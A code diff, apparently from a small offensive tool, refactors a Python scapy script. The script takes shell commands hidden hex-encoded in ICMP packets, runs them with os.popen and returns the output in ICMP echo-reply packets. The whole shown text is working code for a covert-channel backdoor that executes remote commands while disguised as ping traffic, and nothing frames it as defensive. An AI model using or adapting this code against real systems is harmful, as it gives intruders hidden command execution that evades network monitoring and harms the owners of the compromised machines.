@@ -10,13 +10,15 @@ server = "127.0.0.1"
 def send_cmd(cmd):
 	hex_cmd = binascii.hexlify(cmd.encode("utf8"))
 	packet = IP(dst=server)/ICMP(type="echo-reply", id=0x6341, seq=0x1)/hex_cmd
-	send(packet)
-	print("done")
+	send(packet, verbose=0)
+	print("[+] Packet sent")
 
-recv = sniff(filter="host 127.0.0.1 and icmp", count=1, iface="lo")
-print(recv)
-data = recv[0][Raw].load.decode('utf-8')
-cmd = binascii.unhexlify(data).decode("utf8")
-out = os.popen(cmd).read()
+def recv_cmd():
+	recv = sniff(filter="host 127.0.0.1 and icmp", count=1, iface="lo")
+	print("[+] Packet received")
+	data = recv[0][Raw].load.decode('utf-8')
+	cmd = binascii.unhexlify(data).decode("utf8")
+	return cmd
 
+out = os.popen(recv_cmd()).read()
 send_cmd(out)
